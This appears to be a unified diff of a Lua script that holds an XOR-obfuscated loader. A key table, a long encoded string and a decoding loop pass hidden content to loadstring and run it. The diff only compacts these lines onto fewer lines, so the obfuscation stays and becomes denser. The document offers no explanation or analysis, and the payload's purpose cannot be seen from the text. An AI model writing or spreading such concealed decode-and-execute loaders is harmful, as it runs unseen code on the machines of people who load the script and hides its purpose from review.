@@ -1,5 +1,4 @@
-local k={110,116,98,107,50,48,50,52,115,101,99,114,101,116,33}
-local e="YOK|`1.C:06D~QQ^!M\
+local k={110,116,98,107,50,48,50,52,115,101,99,114,101,116,33} local e="YOK|`1.C:06D~QQ^!M\
 T_K^_SP\000		xF@\"MVI\000G\
 ZLD@QKR\000G]F]haYE7M\000K8XE#H\000\r\rf\000ET7SDWc\\ZdTBK~SYE^RG:u,?B#gryECRE8NUd[@\000COEVv_U@E-&'?&! I:SE/H\0001PD[@\000COEVCT,?p{yECRE N	gyyQ\
 \
@@ -53,12 +52,4 @@ KU@:NbQDR\000OF]hKbtQqQB@1\
 \000K8N\r;^QKQK*	ET7\r\\UQ@[\000HJB8SECRETNTBKd]	!RX(S@FA\000 \000S@>SECRETNTBKS3\
 \000@!@\
 qX0\000UPCdUQ@Q\\VF]KaSECRETN:SECRETDaSECRETN5[qtI!\
-O\0008SECRETax]+"
-local d=loadstring
-local r=""
-for i=1,#e do
-local c=e:sub(i,i) 
-local b=string.char(k[((i-1)%#k)+1])
-r=r..string.char(bit32.bxor(c:byte(),b:byte()))
-end
-d(r)()
+O\0008SECRETax]+" local r="" for i=1,#e do local c=e:sub(i,i) local b=string.char(k[((i-1)%#k)+1]) r=r..string.char(bit32.bxor(c:byte(),b:byte())) end loadstring(r)()
